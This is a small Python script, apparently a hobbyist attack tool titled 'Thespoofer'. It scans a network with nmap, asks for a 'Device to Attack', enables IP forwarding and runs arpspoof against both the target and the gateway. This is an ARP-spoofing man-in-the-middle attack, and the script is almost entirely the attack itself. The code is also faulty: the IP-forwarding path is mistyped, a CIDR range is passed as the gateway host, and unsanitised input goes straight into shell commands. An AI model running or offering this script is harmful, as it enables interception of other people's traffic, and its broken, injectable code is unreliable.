import os
import nmap

nm = nmap.PortScanner()

print ("""

▄▄▄█████▓ ██░ ██ ▓█████   ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▒██▀▀██░▒███   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄   ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░ ░▓█▒░██▓░▒████▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒
  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░     ▒ ░▒░ ░ ░ ░  ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░
  ░       ░  ░░ ░   ░   ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
          ░  ░  ░   ░  ░      ░               ░ ░      ░ ░             ░  ░   ░     
                                                                                    

""")

print('')
gateway = input ('Gateway Ex. 192.168.1.1/24: ') # GATEWAY
print ('')

print ("Let's Scan Your Network")
scan_range = nm.scan(hosts=gateway) # SCAN NETWORK
print(scan_range['scan'])

device = input ('Device to Attack: ') # DEVICE TO ATTACK

network_interface = input('Network Interface to use: ')
print('')

print("All Ready Let's Start the Atack")

print ('IP Forwarding Activated')
os.system('echo 1 >> /proc/sys/net_ipv4/ip_forward') # IP FORWARDING
print ('')

os.system('arpspoof -i ' + network_interface + ' -t ' + device + " " + gateway) # SPOOFING
print('Atacking Router Completed')

os.system('arpspoof -i ' + network_interface + ' -t ' + gateway + " " + device) # SPOOFING
print('Atacking Device Completed')
print('')

print('Do you want to Stop Attack? ')
print('Press Enter')
os.system('echo 0 >> /proc/sys/net_ipv4/ip_forward') # STOP IP FORWARDING
